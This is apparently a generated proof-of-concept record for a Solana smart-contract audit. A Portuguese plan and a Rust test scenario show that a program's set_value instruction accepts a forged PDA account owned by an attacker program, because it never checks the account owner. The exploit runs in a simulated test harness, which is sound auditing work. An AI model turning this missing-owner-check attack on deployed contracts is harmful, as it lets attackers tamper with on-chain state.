{"plan": "O programa set_value (Pinocchio) valida apenas que accounts[0] é o PDA derivado de [b"data", user, bump], mas nunca verifica o owner da conta. Para o baseline, criamos uma conta PDA legítima com owner = program_id e chamamos set_value com bump e value válidos, provando que o cenário está montado. No ataque, fornecemos a mesma conta PDA mas com owner = attacker_program (conta forjada), mantendo o mesmo endereço e os mesmos argumentos. O efeito medido é que a instrução teve sucesso e gravou os dados na conta cujo owner não é o programa-alvo, demonstrando a ausência de checagem de owner.", "scenario": "let user = Pubkey::new_unique();

let (pda, bump) = Pubkey::find_program_address(&[b"data", user.as_ref()], &env.program_id);

let value: u64 = 42;

// Conta PDA legitima: owner = program_id
let legit_data = account(&env.program_id, &[0u8; 49], None);
let user_acc = wallet(1_000_000_000);

let ix = env.raw_ix(
    &{
        let mut d = vec![IX_SET_VALUE];
        d.push(bump);
        d.extend_from_slice(&value.to_le_bytes());
        d
    },
    &[
        AccountMeta::new(pda, false),
        AccountMeta::new_readonly(user, false),
    ],
);

let contas = vec![
    (pda, legit_data.clone()),
    (user, user_acc.clone()),
];

let base = env.baseline("set_value legitimo com conta PDA do programa", &ix, &contas);

// Ataque: mesma conta PDA, mas com owner = attacker_program (conta forjada)
let attacker_owner = env.attacker_program.unwrap_or(Pubkey::new_unique());
let forged_data = account(&attacker_owner, &[0u8; 49], None);

let contas_ataque = vec![
    (pda, forged_data),
    (user, user_acc),
];

let r = env.attack("set_value aceita conta PDA com owner forjado", &ix, &contas_ataque);

if r.program_result == ProgramResult::Success {
    let d = after(&r, &pda).data();
    env.effect(
        "conta com owner forjado foi modificada pelo programa",
        read_pubkey(d, 8) == user && read_u64(d, 40) == value && d[48] == bump,
    );
    env.effect(
        "owner da conta atacada difere do program_id",
        after(&r, &pda).owner() != &env.program_id,
    );
}"}

